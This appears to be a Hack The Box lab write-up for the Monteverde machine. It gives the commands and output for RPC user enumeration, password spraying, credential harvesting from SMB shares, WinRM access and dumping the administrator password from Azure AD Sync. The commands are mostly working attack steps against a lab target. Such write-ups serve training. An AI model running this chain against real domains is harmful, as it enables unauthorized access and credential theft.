---
layout: post
title: HTB Machine - Monteverde
subtitle: Writeup
cover-img: https://www.hackthebox.com/storage/avatars/00ceebe5dbef1106ce4390365cd787b4.png
thumbnail-img: https://www.hackthebox.com/storage/avatars/00ceebe5dbef1106ce4390365cd787b4.png
share-img: https://www.hackthebox.com/storage/avatars/00ceebe5dbef1106ce4390365cd787b4.png
tags: [ HTB, Hack the Box,Powershell,Azure,Network,Vulnerability Assessment,Cloud,Active Directory,Security Tools,Authentication,Azure,SMB,CrackMapExec,User Enumeration,Password Reuse,Password Spraying,Azure Enumeration,Weak Credentials,Misconfiguration,Anonymous/Guest Access]
---

Verify name of the machine, Windows Version and domain name.
```bash
crackmapexec smb 10.10.10.172 
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
```
we try to connect to the SMB share. Seems we are not able to access the SMB without credentials. 
```bash
smbclient -L 10.10.10.172 -N
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.172 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
we try to connect via RPC (port 593) with a null session and we can connect, then we enumerate the users with enumdomusers.
```bash
rpcclient -U "" 10.10.10.172 -N
rpcclient $> enumdomusers
user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```
it doesnt have to be in an interactive console. We could see the domain groups too.
```bash
rpcclient -U "" 10.10.10.172 -N -c "enumdomusers"

rpcclient -U "" 10.10.10.172 -N -c "enumdomgroups"
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Azure Admins] rid:[0xa29]
group:[File Server Admins] rid:[0xa2e]
group:[Call Recording Admins] rid:[0xa2f]
group:[Reception] rid:[0xa30]
group:[Operations] rid:[0xa31]
group:[Trading] rid:[0xa32]
group:[HelpDesk] rid:[0xa33]
group:[Developers] rid:[0xa34]
```
0x200 is the admin group however is not in the group list. if we try to enumerate only that group we get a permission denied. The group exists but we do not have priviledge to list them.
```bash
rpcclient -U "" 10.10.10.172 -N -c "querygroupmem 0x200"
result was NT_STATUS_ACCESS_DENIED
```
querydispinfo command display the users' descriptions but there is nothing interesting there. So we are gonna try a AESroast but we need then the users, we are going to extract them with a regex.
```bash
rpcclient -U "" 10.10.10.172 -N -c "enumdomusers" | grep -oP '\[.*?\]' | grep -v "0x" | tr -d '[]' > users.txt
```
We have our list of users now we can try the GetNPUsers for a TGT.
```bash
GetNPUsers.py -no-pass -usersfile users.txt MEGABANK.LOCAL/
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User AAD_987d7f2f57d2 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mhope doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User SABatchJobs doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-ata doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-bexec doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-netapp doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User dgalanos doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User roleary doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User smorgan doesn't have UF_DONT_REQUIRE_PREAUTH set
```
however no user has it set so we cannot do a AS-REP roast attack. Lets try a Auth spray with the users we have, it could be that a user used his password as the login. We configure crackmapexec and set the flag to continue searching even if it finds one credential.
```bash
crackmapexec smb 10.10.10.172 -u users.txt -p users.txt --continue-on-success
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
```
we can check the smb shares now with the credentials.
```bash
smbmap -H 10.10.10.172 -u 'SABatchJobs' -p 'SABatchJobs'
[+] IP: 10.10.10.172:445	Name: MEGABANK.LOCAL                                    
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	azure_uploads                                     	READ ONLY	
	C$                                                	NO ACCESS	Default share
	E$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
	users$                                            	READ ONLY	
```	
enumerate each folder. In one folder there is a file that we donwload and open. There are some credentials inside the file. 
```bash
smbmap -H 10.10.10.172 -u 'SABatchJobs' -p 'SABatchJobs' -r users$/mhope
[+] IP: 10.10.10.172:445	Name: MEGABANK.LOCAL                                    
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	users$                                            	READ ONLY	
	.\users$mhope\*
	dr--r--r--                0 Fri Jan  3 14:41:18 2020	.
	dr--r--r--                0 Fri Jan  3 14:41:18 2020	..
	fw--w--w--             1212 Fri Jan  3 15:59:24 2020	azure.xml
	
smbmap -H 10.10.10.172 -u 'SABatchJobs' -p 'SABatchJobs' --download users$/mhope/azure.xml
[+] Starting download: users$\mhope\azure.xml (1212 bytes)
```
Alternative we can crawl the folders.
```bash
smbmap -u SABatchJobs -p SABatchJobs -d megabank -H 10.10.10.172 -A '(xlsx|docx|txt|xml)' -R
```
We can try a kerberoast with GetUserSPNs.py. but no luck.
```bash
GetUserSPNs.py  MEGABANK.LOCAL/SABatchJobs:SABatchJobs -dc-ip 10.10.10.172
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

No entries found!
```
also not possible to winrm with the user since it is not part of remote management users.
```bash
crackmapexec winrm 10.10.10.172 -u "SABatchJobs" -p "SABatchJobs"
SMB         10.10.10.172    5985   MONTEVERDE       [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL)
HTTP        10.10.10.172    5985   MONTEVERDE       [*] http://10.10.10.172:5985/wsman
WINRM       10.10.10.172    5985   MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
```
so we try the credentials found against all users
```bash
crackmapexec smb 10.10.10.172 -u users.txt -p '4n0therD4y@n0th3r$' --continue-on-success
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
...
```
we try winrm against that user and is pwned.
```bash
crackmapexec winrm 10.10.10.172 -u "mhope" -p "4n0therD4y@n0th3r$"
SMB         10.10.10.172    5985   MONTEVERDE       [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL)
HTTP        10.10.10.172    5985   MONTEVERDE       [*] http://10.10.10.172:5985/wsman
WINRM       10.10.10.172    5985   MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$ (Pwn3d!)
```
we winrm and get the user flag. 
```bash
evil-winrm -i 10.10.10.172 -u 'mhope' -p '4n0therD4y@n0th3r$'
```                                      
we check the priviledge this users has and it has Azure Admin. 
```bash
whoami /all
(snip)
MEGABANK\Azure Admins                       Group            S-1-5-21-391775091-850290835-3566037492-2601 Mandatory group, Enabled by default, Enabled group
(snip)
```
we can check in program files if there is something related to azure, there are some folders but interesting is MS Azure AD sync. Checking online for AAD sync exploit there is a script

[AAD Connect Database exploit](https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/)

[ADSync Decrypt script](https://github.com/VbScrub/AdSyncDecrypt/releases)

After unzip the AdDecrypt.zip we need to upload it to the target. 
```bash
Evil-WinRM* PS C:\Windows\Temp\PrivEsc> upload AdDecrypt.exe
Info: Upload successful!
Evil-WinRM* PS C:\Windows\Temp\PrivEsc> upload mcrypt.dll
Info: Upload successful!
```
if we check the documentation it says that we need to be in the folder C:\Program Files\Microsoft Azure AD Sync\Bin and from there execute the .exe we just uploaded. In the blog it is explain that using the flag is going to attempt the full fat MS SQL instance.
```bash
*Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\Bin> C:\Windows\Temp\Privesc\AdDecrypt.exe -FullSQL

======================
AZURE AD SYNC CREDENTIAL DECRYPTION TOOL
Based on original code from: https://github.com/fox-it/adconnectdump
======================

Opening database connection...
Executing SQL commands...
Closing database connection...
Decrypting XML...
Parsing XML...
Finished!

DECRYPTED CREDENTIALS:
Username: administrator
Password: d0m@in4dminyeah!
Domain: MEGABANK.LOCAL
```
We verify the password with crackmapexec and finally gain access via winrm.
```bash
crackmapexec winrm 10.10.10.172 -u 'Administrator' -p 'd0m@in4dminyeah!'
SMB         10.10.10.172    5985   MONTEVERDE       [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL)
HTTP        10.10.10.172    5985   MONTEVERDE       [*] http://10.10.10.172:5985/wsman
WINRM       10.10.10.172    5985   MONTEVERDE       [+] MEGABANK.LOCAL\Administrator:d0m@in4dminyeah! (Pwn3d!)

evil-winrm -i 10.10.10.172 -u 'Administrator' -p 'd0m@in4dminyeah!'
```